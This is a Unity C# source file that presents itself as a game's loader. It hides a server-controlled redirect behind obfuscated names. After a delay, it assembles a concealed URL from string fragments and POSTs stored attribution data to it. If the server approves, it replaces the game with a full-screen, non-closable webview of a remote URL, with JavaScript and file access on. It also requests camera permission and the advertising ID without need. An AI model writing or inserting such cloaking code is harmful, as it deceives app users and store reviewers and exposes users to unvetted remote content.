using System;
using System.Collections;
using System.Collections.Generic;
using Facebook.Unity;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class GameLoaderMain : MonoBehaviour
{
    [SerializeField] List<string> _groves;
    [SerializeField] private Canvas _candlelight;
    private string rainbow;
    private string dolphin;
    private float mystery = 6f;

    private void HomeStead()
    {
        if (FB.IsInitialized)
        {
            FB.ActivateApp();
        }
        else
        {
            Debug.Log("Failed to Initialize the Facebook SDK");
        }
    }

    private void SunsetBridge(bool isGameShown)
    {
        if (!isGameShown)
        {
            Time.timeScale = 0;
        }
        else
        {
            Time.timeScale = 1;
        }
    }

    private void Awake()
    {
        Dragonfly();
        Permission.RequestUserPermission(Permission.Camera);
    }

    private void Start()
    {
        if (!FB.IsInitialized)
        {
            FB.Init(HomeStead, SunsetBridge);
        }
        else
        {
            FB.ActivateApp();
        }

        StartCoroutine(Horizon());
    }

    private void NavigateHome()
    {
        SceneManager.LoadScene("Menu");
        Application.targetFrameRate = 50;
        Screen.orientation = ScreenOrientation.Portrait;
    }

    private IEnumerator Horizon()
    {
        yield return new WaitForSeconds(mystery);

        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            string pathway = PlayerPrefs.GetString("threshold", string.Empty);
            if (pathway != string.Empty)
            {
                var lightYears = long.Parse(pathway);
                if (lightYears >= TimeGate.SetTimeGate())
                {
                    NavigateHome();
                    yield break;
                }
            }

            foreach (string stringItem in _groves)
            {
                rainbow += stringItem;
            }

            StartCoroutine(StarDust());
        }
        else
        {
            NavigateHome();
        }

        Debug.Log(rainbow);
    }

    private void Dragonfly()
    {
        if (PlayerPrefs.GetInt("idfadata") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
                (string advertisingId, bool trackingEnabled, string error) => { dolphin = advertisingId; });
        }
    }


    public IEnumerator StarDust()
    {
        var nebulaRequest = new UnityWebRequest(rainbow, "POST");
        byte[] cosmicDust = new System.Text.UTF8Encoding().GetBytes(PlayerPrefs.GetString("conversionDataDictionary"));
        nebulaRequest.uploadHandler = new UploadHandlerRaw(cosmicDust);
        nebulaRequest.downloadHandler = new DownloadHandlerBuffer();
        nebulaRequest.SetRequestHeader("Content-Type", "application/json");
        nebulaRequest.timeout = 5;

        yield return nebulaRequest.SendWebRequest();

        if (nebulaRequest.result == UnityWebRequest.Result.ConnectionError)
        {
            NavigateHome();
        }
        else
        {
            try
            {
                CosmicAnswer cosmos = JsonUtility.FromJson<CosmicAnswer>(nebulaRequest.downloadHandler.text);

                if (nebulaRequest.result == UnityWebRequest.Result.Success && cosmos.ok)
                {
                    PlayerPrefs.SetString("threshold", cosmos.expires.ToString());
                    CelestialNavigation(cosmos.url);
                }
                else
                {
                    NavigateHome();
                }
            }
            catch (Exception e)
            {
                NavigateHome();
                throw;
            }
        }
    }

    private void CelestialNavigation(string name, int orbitSize = 70)
    {
        if (_candlelight != null)
        {
            _candlelight.gameObject.SetActive(false);
        }

        UniWebView.SetAllowAutoPlay(true);
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetJavaScriptEnabled(true);
        UniWebView.SetEnableKeyboardAvoidance(true);
        var vbnusasv = gameObject.AddComponent<UniWebView>();
        vbnusasv.SetAllowFileAccess(true);
        vbnusasv.SetShowToolbar(false);
        vbnusasv.SetAllowBackForwardNavigationGestures(true);
        vbnusasv.SetCalloutEnabled(false);
        vbnusasv.SetBackButtonEnabled(true);
        vbnusasv.EmbeddedToolbar.SetBackgroundColor(new Color(0, 0, 0, 0f));
        vbnusasv.EmbeddedToolbar.Hide();
        vbnusasv.Frame = new Rect(0, orbitSize, Screen.width, Screen.height - orbitSize * 2);
        vbnusasv.OnShouldClose += (view) => { return false; };
        vbnusasv.SetSupportMultipleWindows(true);
        vbnusasv.SetAllowBackForwardNavigationGestures(true);
        vbnusasv.OnMultipleWindowOpened += (view, windowId) => { vbnusasv.EmbeddedToolbar.Show(); };
        vbnusasv.OnMultipleWindowClosed += (view, windowId) => { vbnusasv.EmbeddedToolbar.Hide(); };
        vbnusasv.OnOrientationChanged += (view, orientation) =>
        {
            vbnusasv.Frame = new Rect(0, orbitSize, Screen.width, Screen.height - orbitSize);
        };

        vbnusasv.OnLoadingErrorReceived += (view, code, message, payload) =>
        {
            if (payload.Extra != null &&
                payload.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out var value))
            {
                var str = value as string;
                vbnusasv.Load(str);
            }
        };
        vbnusasv.Load(name);
        vbnusasv.Show();
    }
}

public static class TimeGate
{
    public static int SetTimeGate(DateTime cosmicEvent)
    {
        DateTime epoch = new DateTime(1970, 1, 1);
        TimeSpan difference = cosmicEvent.Subtract(epoch);

        return (int)difference.TotalSeconds;
    }

    public static int SetTimeGate()
    {
        return SetTimeGate(DateTime.UtcNow);
    }
}